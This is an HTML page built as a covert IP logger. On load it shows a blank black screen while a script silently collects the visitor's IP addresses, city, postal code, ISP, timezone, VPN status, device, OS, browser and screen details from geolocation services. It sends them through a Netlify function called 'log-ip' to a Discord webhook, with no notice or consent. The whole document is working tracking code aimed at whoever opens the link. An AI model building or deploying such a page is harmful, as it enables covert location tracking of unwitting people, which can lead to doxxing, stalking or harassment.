<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title></title>
  <style>
    html, body {
      margin: 0; padding: 0; height: 100%;
      background: black;
      user-select: none;
      overflow: hidden;
    }
    #error-message {
      position: fixed;
      top: 0; left: 0; right: 0;
      color: red;
      background: black;
      padding: 10px;
      font-family: monospace;
      white-space: pre-wrap;
      cursor: pointer;
      display: none;
      z-index: 9999;
      max-height: 50vh;
      overflow-y: auto;
    }
  </style>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.2/ua-parser.min.js"></script>
</head>
<body>
  <div id="error-message" title="Click to copy error message"></div>

<script>
  const netlifyFunctionUrl = "/.netlify/functions/log-ip";

  function safeGet(obj, path, defaultValue = '') {
    return path.reduce((acc, key) => (acc && acc[key] !== undefined) ? acc[key] : defaultValue, obj);
  }

  // Clip and sanitize field name/value for Discord limits & invalid characters
  function sanitizeFieldName(name) {
    if (!name) return "N/A";
    name = name.toString().trim();
    if (name.length === 0) return "N/A";
    name = name.replace(/[\u0000-\u001F\u007F]/g, ""); // remove control chars
    return name.length > 256 ? name.slice(0, 253) + "..." : name;
  }

  function sanitizeFieldValue(value) {
    if (value === undefined || value === null) return "N/A";
    value = value.toString().trim();
    if (value.length === 0) return "N/A";
    value = value.replace(/[\u0000-\u001F\u007F]/g, ""); // remove control chars
    return value.length > 1024 ? value.slice(0, 1021) + "..." : value;
  }

  function chunkArray(arr, size) {
    const result = [];
    for(let i = 0; i < arr.length; i += size) {
      result.push(arr.slice(i, i + size));
    }
    return result;
  }

  async function fetchFallbackGeo(ip) {
    try {
      const res = await fetch(`https://ipapi.co/${ip}/json/`);
      if (!res.ok) return null;
      return res.json();
    } catch {
      return null;
    }
  }

  async function fetchIPInfo() {
    const res = await fetch('https://ipwhois.app/json/');
    if (!res.ok) throw new Error('Failed to fetch IP info');
    return res.json();
  }

  async function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  async function sendDiscordWebhookBatched(embeds) {
    if (!embeds || embeds.length === 0) throw new Error("No embeds to send");

    const cleanEmbeds = embeds.map(embed => {
      if (!embed.fields || embed.fields.length === 0) return embed;
      embed.fields = embed.fields
        .map(f => {
          const name = sanitizeFieldName(f.name);
          const value = sanitizeFieldValue(f.value);
          return { name, value, inline: !!f.inline };
        });
      return embed;
    });

    if (cleanEmbeds.length === 0) throw new Error("No valid embed fields after sanitizing");

    // Chunk embeds into batches of 5 (Discord max embeds per message)
    const embedBatches = chunkArray(cleanEmbeds, 5);

    for (let i = 0; i < embedBatches.length; i++) {
      const batch = embedBatches[i];
      try {
        const res = await fetch(netlifyFunctionUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ embeds: batch }),
        });
        if (!res.ok) {
          const text = await res.text();
          throw new Error(`Discord webhook error: ${res.status} - ${text}`);
        }
      } catch (e) {
        const errorDiv = document.getElementById('error-message');
        errorDiv.style.display = 'block';
        errorDiv.textContent = `❌ Discord webhook error:\n\n${e.message}\n\nPayload:\n${JSON.stringify({ embeds: batch }, null, 2)}\n\nTap to copy`;
        errorDiv.onclick = () => {
          navigator.clipboard.writeText(errorDiv.textContent)
            .then(() => alert("Error and payload copied! Send it to me."))
            .catch(() => alert("Failed to copy."));
        };
        throw e;
      }
      // Wait 1 second between batches to avoid rate limits
      if (i < embedBatches.length -1) await delay(1000);
    }
  }

  (async () => {
    const errorDiv = document.getElementById('error-message');

    try {
      let data = await fetchIPInfo();
      const fallback = await fetchFallbackGeo(data.ip);

      const parser = new UAParser();
      const result = parser.getResult();

      const deviceModel = result.device.model || "N/A";
      const deviceType = result.device.type || "N/A";
      const deviceVendor = result.device.vendor || "N/A";
      const osName = result.os.name || "N/A";
      const osVersion = result.os.version || "N/A";
      const browserName = result.browser.name || "N/A";
      const browserVersion = result.browser.version || "N/A";

      const localTime = new Date().toLocaleString("en-US", { timeZone: data.timezone || (fallback ? fallback.timezone : undefined) });

      data = {
        ...data,
        city: data.city || (fallback ? fallback.city : 'N/A'),
        region: data.region || (fallback ? fallback.region : 'N/A'),
        postal: data.postal || (fallback ? fallback.postal : 'N/A'),
        ipv6: data.ipv6 || (fallback ? fallback.ipv6 : 'N/A'),
        hostname: data.hostname || (fallback ? fallback.hostname : 'N/A'),
      };

      let isMobile = safeGet(data, ['security', 'is_mobile'], false);
      if (!isMobile) {
        const ua = navigator.userAgent.toLowerCase();
        isMobile = /mobile|android|iphone|ipad|phone/.test(ua);
      }

      const allFields = [
        { name: "IPv4 Address", value: `\`${data.ip || "N/A"}\``, inline: true },
        { name: "IPv6 Address", value: data.ipv6 || "N/A", inline: true },
        { name: "Hostname", value: data.hostname || "N/A", inline: true },
        { name: "Country", value: `${data.country || "N/A"} (${data.country_code || "N/A"})`, inline: true },
        { name: "Region", value: data.region || "N/A", inline: true },
        { name: "City", value: data.city || "N/A", inline: true },
        { name: "Zip", value: data.postal || "N/A", inline: true },
        { name: "ISP", value: data.isp || "N/A", inline: false },
        { name: "Organization", value: data.org || "N/A", inline: false },
        { name: "ASN", value: data.asn || "N/A", inline: true },
        { name: "Timezone", value: `${data.timezone_gmt || "N/A"} (${data.timezone || "N/A"})`, inline: true },
        { name: "Local Time", value: localTime || "N/A", inline: true },
        { name: "VPN/Proxy", value: safeGet(data, ['security', 'is_proxy']) ? "Yes" : "No", inline: true },
        { name: "VPN/Hosting", value: safeGet(data, ['security', 'is_hosting']) ? "Yes" : "No", inline: true },
        { name: "Mobile", value: isMobile ? "Yes" : "No", inline: true },
        { name: "Bot", value: safeGet(data, ['security', 'is_bot']) ? "Yes" : "No", inline: true },
        { name: "Device Model", value: deviceModel, inline: true },
        { name: "Device Type", value: deviceType, inline: true },
        { name: "Device Vendor", value: deviceVendor, inline: true },
        { name: "OS Name", value: osName, inline: true },
        { name: "OS Version", value: osVersion, inline: true },
        { name: "Browser Name", value: browserName, inline: true },
        { name: "Browser Version", value: browserVersion, inline: true },
        { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
        { name: "Screen Resolution", value: `\`${window.screen.width}×${window.screen.height} (Logical), ${Math.round(window.screen.width * window.devicePixelRatio)}×${Math.round(window.screen.height * window.devicePixelRatio)} (Physical)\``, inline: true },
      ];

      const embedChunks = chunkArray(allFields, 25);
      await sendDiscordWebhookBatched(embedChunks);

    } catch (err) {
      errorDiv.style.display = 'block';
      errorDiv.textContent = `❌ Error: ${err.message}\n\nTap to copy`;
      errorDiv.onclick = () => {
        navigator.clipboard.writeText(err.message)
          .then(() => alert("Error message copied! Send it to me."))
          .catch(() => alert("Failed to copy error message."));
      };
    }
  })();
</script>
</body>
</html>
